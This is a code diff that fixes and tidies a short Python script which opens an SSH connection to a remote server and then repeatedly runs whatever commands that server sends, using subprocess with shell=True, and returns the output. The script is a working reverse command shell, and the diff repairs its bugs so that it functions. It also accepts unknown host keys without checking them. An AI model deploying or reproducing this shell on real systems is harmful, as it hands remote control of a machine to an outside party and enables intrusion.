@@ -1,31 +1,31 @@
-#ssh_cmd but it runs on wndows client
+# ssh_cmd but it runs on windows client
 import paramiko
 import shlex
 import subprocess
 
-#connects to a SSH server and runs a single command
+# Connects to a SSH server and runs a single command
 def ssh_command(ip, port, user, passwd, command):
     client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
-    #Set the policy to accept the SSH key for the server (cause we are both)
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Accept unknown host keys
     client.connect(ip, port=port, username=user, password=passwd)
     
     ssh_session = client.get_transport().open_session()
     if ssh_session.active:
         ssh_session.send(command)
-    
-    print(ssh_session.recv(1024).decode())
-    while True:
-        command = ssh_session.recv(1024)
-        try:
-            cmd = command.decode()
-            if cmd == 'exit':
-                client.close()
+        print(ssh_session.recv(1024).decode())
+
+        while True:
+            command = ssh_session.recv(1024)
+            if not command:
                 break
-            cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
-            ssh_session.snde(cmd_output or 'okay')
-        except Exception as e:
-            ssh_session.send(str(e))
-        client.close()
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    break
+                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                ssh_session.send(cmd_output or b'okay')
+            except Exception as e:
+                ssh_session.send(str(e).encode())
+    
+    client.close()
     return
- 
